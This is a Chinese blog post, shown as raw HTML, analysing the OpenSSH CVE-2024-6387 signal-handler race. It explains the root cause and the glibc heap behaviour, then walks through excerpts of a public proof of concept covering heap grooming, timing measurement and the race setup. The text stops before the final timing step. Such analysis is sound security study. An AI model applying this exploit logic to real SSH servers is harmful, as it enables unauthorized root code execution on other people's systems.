<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="近几天，OpenSSH 爆出了一个非常严重的安全漏洞，该漏洞可导致未授权的root权限任意代码执行，即 Unauthorized root RCE。部分媒体评估称，该漏洞预计将影响超过 1400 万台使用含有该漏洞的计算机设备，其中以 Linux 发行版为主。该漏洞主要影响版本为 [8.5p1, 9.8p1)，在 9.8p1 版本中 OpenSSH 将其修复，可通过 OpenSSH release">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-6387 分析">
<meta property="og:url" content="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:description" content="近几天，OpenSSH 爆出了一个非常严重的安全漏洞，该漏洞可导致未授权的root权限任意代码执行，即 Unauthorized root RCE。部分媒体评估称，该漏洞预计将影响超过 1400 万台使用含有该漏洞的计算机设备，其中以 Linux 发行版为主。该漏洞主要影响版本为 [8.5p1, 9.8p1)，在 9.8p1 版本中 OpenSSH 将其修复，可通过 OpenSSH release">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/4.png">
<meta property="og:image" content="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/3.png">
<meta property="og:image" content="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/CVE-2024-6387-%E5%88%86%E6%9E%90/2.png">
<meta property="og:image" content="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/2.png">
<meta property="article:published_time" content="2024-07-02T02:52:01.000Z">
<meta property="article:modified_time" content="2024-07-19T02:37:13.257Z">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/4.png">

<link rel="canonical" href="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2024-6387 分析 | CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2024-6387 分析
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-02 10:52:01" itemprop="dateCreated datePublished" datetime="2024-07-02T10:52:01+08:00">2024-07-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-19 10:37:13" itemprop="dateModified" datetime="2024-07-19T10:37:13+08:00">2024-07-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>9.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>近几天，OpenSSH 爆出了一个非常严重的安全漏洞，该漏洞可导致未授权的root权限任意代码执行，即 Unauthorized root RCE。部分媒体评估称，该漏洞预计将影响超过 1400 万台使用含有该漏洞的计算机设备，其中以 Linux 发行版为主。该漏洞主要影响版本为 [8.5p1, 9.8p1)，在 9.8p1 版本中 OpenSSH 将其修复，可通过 OpenSSH release notes 查看。这个漏洞的影响是毁灭性的，它可以在基于 glibc 的 Linux 系统上远程利用，获得未经授权的Root级别代码执行。更令人担忧的是，sshd以完全特权运行，且未沙箱化，这使得攻击面更加严峻。目前，针对搭载 Glibc 的 32 位 Linux 发行版的漏洞 PoC 已经发布，根据漏洞发现者披露，该漏洞在 64 位 Linux 中很可能也可以进行利用，对于 MacOS 与 Windows 也有一定的潜在风险。</p>
<p>下面对该漏洞进行简要分析。</p>
<p>分析使用的OpenSSH版本：9.7p1</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">资料</a></p>
<h1 id="a-漏洞成因"><a class="markdownIt-Anchor" href="#a-漏洞成因"></a> A. 漏洞成因</h1>
<p>这个漏洞可以看做是 CVE-2006-5051 的重演，该漏洞在 8.5p1 版本被引入，产生的原因是在 commit 752250C 中错误地删除了 sigdie() 函数中的一条语句 <code>#ifdef DO_LOG_SAFE_IN_SIGHAND</code>，该函数在<code>SIGALRM</code>信号的 handler 函数中被直接调用。因此实际上该漏洞对于 &lt;4.4p1 版本的 OpenSSH 也有效。</p>
<p>commit 信息：<a target="_blank" rel="noopener" href="https://github.com/openssh/openssh-portable/commit/752250caabda3dd24635503c4cd689b32a650794#diff-cac4c5e540bb96b16908efb139929424aa8065d1acaa0af3791e19aa775bbf42">链接</a></p>
<p><img src="4.png" alt="" /></p>
<p>在 SSHd 的 main 函数中，通过 <code>ssh_signal</code> 函数注册了对于 <code>SIGALRM</code> 信号的 handler 函数 <code>grace_alarm_handler</code>。在 SSHd 中，如果客户端在 <code>LoginGraceTime</code> （较新版本默认为120s）时间内没有完成认证，则会产生 <code>SIGALRM</code> 信号，并异步调用 <code>grace_alarm_handler</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sshd.c, line 2222</span></span><br><span class="line"></span><br><span class="line">ssh_signal(SIGALRM, grace_alarm_handler);</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// sshd.c, line 349</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal handler for the alarm after the login grace period has expired.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">grace_alarm_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to kill any processes that we have spawned, E.g. authorized</span></span><br><span class="line"><span class="comment">	 * keys command helpers or privsep children.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (getpgid(<span class="number">0</span>) == getpid()) &#123;</span><br><span class="line">		ssh_signal(SIGTERM, SIG_IGN);</span><br><span class="line">		kill(<span class="number">0</span>, SIGTERM);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Log error and exit. */</span></span><br><span class="line">	sigdie(<span class="string">&quot;Timeout before authentication for %s port %d&quot;</span>,</span><br><span class="line">	    ssh_remote_ipaddr(the_active_state),</span><br><span class="line">	    ssh_remote_port(the_active_state));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注 <code>sigdie</code>。下面是该函数的一条调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sigdie                  // log.h, line 96</span><br><span class="line">  sshsigdie             // log.c, line 450</span><br><span class="line">    sshlogv             // log.c, line 463</span><br><span class="line">      do_log            // log.c, line 336</span><br><span class="line">        syslog</span><br></pre></td></tr></table></figure>
<p><code>syslog</code> 是libc实现的库函数。如果在其中调用了异步执行不安全的函数（如 <code>malloc</code> ，因为 <code>malloc</code> 进行内存分配时不会加锁），那么就有可能出现内存不安全问题。</p>
<p>事实是，它确实调用了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syslog                        /misc/bits/syslog.h, line 28</span><br><span class="line">  __syslog_chk                /misc/syslog.c, line 103</span><br><span class="line">    __vsyslog_internal        /misc/syslog.c, line 119</span><br><span class="line">      __localtime64_r         /time/localtime.c, line 27</span><br><span class="line">        __tz_convert          /time/tzset.c, line 566</span><br><span class="line">          tzset_internal      /time/tzset.c, line 366</span><br><span class="line">            __tzfile_read     /time/tzset.c, line 100</span><br><span class="line">              fopen</span><br><span class="line">              __fread_unlocked</span><br></pre></td></tr></table></figure>
<p>当 <code>__localtime64_r</code> 第一次执行时，将按照上面的流程执行。可以看到，这里的 <code>fopen</code> 即为异步不安全函数调用，它的内部需要调用 <code>malloc</code> 分配一个 <code>FILE</code> 结构。在 <code>__fread_unlocked</code> 中也需要调用 <code>malloc</code> 分配一个 4KB 的读缓冲区。</p>
<h1 id="b-漏洞利用前置知识"><a class="markdownIt-Anchor" href="#b-漏洞利用前置知识"></a> B. 漏洞利用前置知识</h1>
<p>要深入理解该漏洞的整个利用逻辑，首先需要了解一些前置知识。</p>
<h2 id="b1-相关-ssh-协议报文格式"><a class="markdownIt-Anchor" href="#b1-相关-ssh-协议报文格式"></a> B.1 相关 SSH 协议报文格式</h2>
<p>OpenSSH 实现了对于 SSH 协议的所有解析逻辑，在本漏洞中，需要了解的是 SSH 协议的算法交换部分。</p>
<p>在 SSH 建立连接之前，首先需要完成客户端与服务端的算法协商，这些算法包括密钥交换算法、报文加密算法等。因为客户端与服务端的 SSH 版本可能不同，支持的算法也可能不同，因此需要协商出客户端与服务端都实现的算法。对于算法的协商，SSH 协议通过4个报文完成：</p>
<ol>
<li>客户端将自身支持的算法发送至服务端。</li>
<li>服务端将自身支持的算法发送至客户端。</li>
<li>客户端向服务器发送自己选择的算法。</li>
<li>服务端向客户端发送响应，表示收到客户端的算法选择。</li>
</ol>
<p>在前面两个报文中，对于支持算法的发送采用的是 ASCII 明文。具体的 SSH 报文格式如下：</p>
<ul>
<li>4 bytes – SSH 报文总长度（大端序）</li>
<li>1 byte – padding length，即最后用于填充的字节数量</li>
<li>1 byte – message code，即 SSH 报文消息码，算法选择的消息码为 20/0x14</li>
<li>16 bytes – cookie</li>
<li>变长部分 – 用于列举所有本端可用的算法。每一种算法发送的格式为：
<ul>
<li>4 bytes – algorithm length，即算法描述的长度</li>
<li>变长部分 – 算法的具体内容，以 ASCII 码形式发送</li>
</ul>
</li>
</ul>
<p><img src="3.png" alt="" /></p>
<p>可想而知，对于服务端与客户端而言，要想实现对这个报文的解析，必须使用一定的内存空间保存这些算法的相关描述。这一逻辑在 SSHd 中通过 <code>sshkey.c</code> 中的 <code>cert_parse</code>（line 1761）函数实现。在这个函数中循环调用 <code>malloc</code> 函数以保存报文内容。当发送的报文解析失败时，将会调用 <code>sshkey.c</code> 中的 <code>cert_free</code>（line 569）函数循环释放这些内存空间。</p>
<h2 id="b2-glibc-内存分配相关规则"><a class="markdownIt-Anchor" href="#b2-glibc-内存分配相关规则"></a> B.2 Glibc 内存分配相关规则</h2>
<p>该漏洞已经证实能够在基于 Glibc 的 Linux SSH 中完成利用。这与 Glibc 的内存分配策略高度相关。</p>
<p>Glibc 将一块用户可用堆内存（称为 chunk）的大小保存在其前面（低地址）的位置，当用户程序需要释放 chunk 时，Glibc 将根据这块内存的大小将 chunk 链入不同的链表中（这些链表称为 bins）。根据功能不同，Glibc 将这些 bins 分为几类：tcache、fastbin、small bin、large bin、unsorted bin。</p>
<p>Glibc 的内存分配主要通过 <code>_int_malloc</code> 函数实现，释放则主要通过 <code>_int_free</code> 实现。在<a href="elixir.bootlin.com">网址</a>中可以找到所有版本的 Glibc 源码，感兴趣的读者可自行查看。下面介绍与本漏洞相关的一些内存分配特性：</p>
<p>在内存分配过程中，Glibc 首先会从 tcache、fastbin、small bin 中查找，如果没有找到合适的 chunk，则会遍历 unsorted bin 进行查找。unsorted bin 中可保存任意大小的较大的 chunk，遍历过程中，如果发现不等于分配需求的 chunk，会根据其大小将其转移到合适的 small bin/large bin 中。当 unsorted bin 遍历完毕后，如果还是没有找到合适的 chunk，则会尝试在 large bins 中寻找可用的大 chunk 并拆分之。这个拆分操作需要满足多个前提条件，这里不是重点。拆分完成后，剩余的 chunk 将会保存为 last remainder，该 chunk 将被放在 unsorted bin 的开头位置，它将在下一次遍历 unsorted bin 时优先被考虑分配。需要注意的是，<font color=red><strong>remainder chunk 是在其拆分完成后设置其 size 字段的。</strong></font>在 remainder chunk 被切分出来后，但没有设置 size 前，对 size 字段进行修改，即可实际上控制这个 chunk 的大小，可以让这个 chunk 与后面的 chunk 重叠。在 size 字段被正确修改前立即将该 chunk 分配出去，即可完成对堆内存的破坏。</p>
<p><img src="CVE-2024-6387-%E5%88%86%E6%9E%90/2.png" alt="" /></p>
<p>为了保证其他的内存分配操作不会破坏所需的堆内存布局，客户端可以通过多次发送公钥数据包填充 <code>tcache</code>，为了提升利用的成功率，在公钥文件不大于256KB的情况下，可以生成27个 large-small holes 结构。</p>
<h1 id="c-poc"><a class="markdownIt-Anchor" href="#c-poc"></a> C. POC</h1>
<p>POC 来源：<a target="_blank" rel="noopener" href="https://github.com/lflare/cve-2024-6387-poc">github</a></p>
<p>下面分析POC中的关键代码逻辑。通过下面的分析可以帮助读者彻底了解该漏洞的利用方式、</p>
<p>在POC中，首先需要进行与SSH服务器的连接与密钥交换。这部分代码不是重点，略过。</p>
<h2 id="c1-堆内存布局"><a class="markdownIt-Anchor" href="#c1-堆内存布局"></a> C.1 堆内存布局</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_heap</span> <span class="params">(<span class="type">int</span> sock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Packet a: Allocate and free tcache chunks</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> tcache_chunk[<span class="number">64</span>];</span><br><span class="line">      <span class="built_in">memset</span> (tcache_chunk, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, tcache_chunk, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      <span class="comment">// These will be freed by the server, populating tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet b: Create 27 pairs of large (~8KB) and small (320B) holes</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Allocate large chunk (~8KB)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> large_hole[<span class="number">8192</span>];</span><br><span class="line">      <span class="built_in">memset</span> (large_hole, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, large_hole, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate small chunk (320B)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> small_hole[<span class="number">320</span>];</span><br><span class="line">      <span class="built_in">memset</span> (small_hole, <span class="string">&#x27;C&#x27;</span>, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, small_hole, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet c: Write fake headers, footers, vtable and _codecvt pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> fake_data[<span class="number">4096</span>];</span><br><span class="line">      create_fake_file_structure (fake_data, <span class="keyword">sizeof</span> (fake_data),</span><br><span class="line">                                  GLIBC_BASES[<span class="number">0</span>]);</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, fake_data, <span class="keyword">sizeof</span> (fake_data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet d: Ensure holes are in correct malloc bins (send ~256KB string)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> large_string[MAX_PACKET_SIZE - <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">memset</span> (large_string, <span class="string">&#x27;E&#x27;</span>, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">  send_packet (sock, <span class="number">5</span>, large_string, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>send_packet</code> 实现了一个简单的 SSH 协议数据包封装，用于发送 SSH 数据包。</p>
<p>该函数中一共发送了4个数据包，这4个数据包的作用分别为：</p>
<ol>
<li>填充 tcache。</li>
<li>创建 27 个大小 chunk 对，大 chunk 为 8KB，小 chunk 为 320B。</li>
<li>写入伪造的 FILE 结构体数据。</li>
<li>发送一个超大数据包，使得服务端对该 chunk 进行分配与释放，令 glibc 将 27 个大小 chunk 对中的 27 个大 chunk 和 27 个小 chunk 转移到 large bins 与 small bins 中。</li>
</ol>
<h2 id="c2-服务端解析数据时间测量"><a class="markdownIt-Anchor" href="#c2-服务端解析数据时间测量"></a> C.2 服务端解析数据时间测量</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">time_final_packet</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> *parsing_time)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> time_before = measure_response_time (sock, <span class="number">1</span>);</span><br><span class="line">  <span class="type">double</span> time_after = measure_response_time (sock, <span class="number">2</span>);</span><br><span class="line">  *parsing_time = time_after - time_before;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;Estimated parsing time: %.6f seconds\n&quot;</span>, *parsing_time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span></span><br><span class="line"><span class="title function_">measure_response_time</span> <span class="params">(<span class="type">int</span> sock, <span class="type">int</span> error_type)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">end</span>;</span></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line">  send_packet (sock, <span class="number">50</span>, error_packet,</span><br><span class="line">               packet_size); <span class="comment">// SSH_MSG_USERAUTH_REQUEST</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> response[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">ssize_t</span> received;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      received = recv (sock, response, <span class="keyword">sizeof</span> (response), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (received &lt; <span class="number">0</span> &amp;&amp; (errno == EWOULDBLOCK || errno == EAGAIN));</span><br><span class="line"></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;end);</span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> elapsed</span><br><span class="line">      = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">  <span class="keyword">return</span> elapsed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆内存布局完成后，POC 中通过 <code>time_final_packet</code> 来测量服务端解析客户端发送的数据的所需时间。这里测量了两次，分别代表不同错误的解析时间。两次测量对应的错误在 SSHd 中的时间差产生于是否调用了 <code>sshkey_from_blob</code>，因此将两个时间段相减即可得到函数 <code>sshkey_from_blob</code> 的执行时间。</p>
<h2 id="c3-条件竞争"><a class="markdownIt-Anchor" href="#c3-条件竞争"></a> C.3 条件竞争</h2>
<p>完成上述操作之后，客户端还需要发送最后一个超大的 SSH 报文。该报文是算法协商报文，长度为 SSH 协议允许的最大长度。由于 SSH 报文前面带有长度字段，因此一个 SSH 报文允许被包装在多个 TCP 报文中传输。在下面的代码中，POC 直接发送最后一个报文，但故意少发送 1 个字节，让服务端一直等待最后 1 个字节的到来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">attempt_race_condition</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> parsing_time, <span class="type">uint64_t</span> glibc_base)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> final_packet[MAX_PACKET_SIZE];</span><br><span class="line">  create_public_key_packet (final_packet, <span class="keyword">sizeof</span> (final_packet), glibc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Send all but the last byte</span></span><br><span class="line">  <span class="keyword">if</span> (send (sock, final_packet, <span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;send final packet&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>随后，进行计时，准备好在即将超时的瞬间发送最后 1 个字节：</p>
